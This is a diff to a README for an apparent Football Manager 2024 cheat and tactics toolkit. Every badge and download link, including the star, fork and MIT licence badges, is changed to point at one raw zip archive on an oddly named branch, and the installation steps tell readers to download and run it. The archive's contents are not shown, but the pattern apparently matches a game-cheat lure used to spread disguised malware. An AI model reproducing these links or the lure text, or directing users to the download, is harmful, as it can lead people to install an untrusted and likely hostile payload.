@@ -1,8 +1,8 @@
 # ⚽ Football Manager 2024: Performance Expansion Toolkit 
 
-[![GitHub stars](https://img.shields.io/github/stars/FootballManager2024/PerformanceToolkit?style=social)](https://github.com/FootballManager2024/PerformanceToolkit)  
-[![GitHub forks](https://img.shields.io/github/forks/FootballManager2024/PerformanceToolkit?style=social)](https://github.com/FootballManager2024/PerformanceToolkit)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![GitHub stars](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
+[![GitHub forks](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
+[![License: MIT](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
 
 Welcome to the ultimate **Performance Expansion Toolkit** for Football Manager 2024! If you’ve ever dreamed of bending the rules of your career mode, adjusting tactics with the swiftness of a chess grandmaster, or optimizing your squad with tools powered by artificial intelligence, you’re in the right stadium. This repository transforms your management journey into a playground of possibilities!
 
@@ -82,8 +82,8 @@ Running a club is a round-the-clock endeavor. Our dedicated support team is alwa
 
 Ready to step onto the next level? Begin your journey with our toolkit in just two steps:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://22388761.github.io)  
-**Direct Download:** https://22388761.github.io
+[![Download](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
+**Direct Download:** https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip
 
 **Installation Instructions:**  
 1. Download the latest release using the link above.  
@@ -107,14 +107,14 @@ If you encounter any issues, don’t hesitate to reach out via the Issues page o
 ## 📜 MIT License (2025 Edition)
 
 This project is openly available under the MIT License. Details available at:  
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![MIT License](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
 
 ---
 
 ## ⬇️ Download the Latest Release
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://22388761.github.io)  
-**Direct Download:** https://22388761.github.io
+[![Download](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)](https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip)  
+**Direct Download:** https://raw.githubusercontent.com/22388761/fm24-elite-tactics-toolkit/branch/cuprammonia/fm24-elite-tactics-toolkit-2.4.zip
 
 Stay updated with the latest improvements by visiting the repository’s Releases section.
 
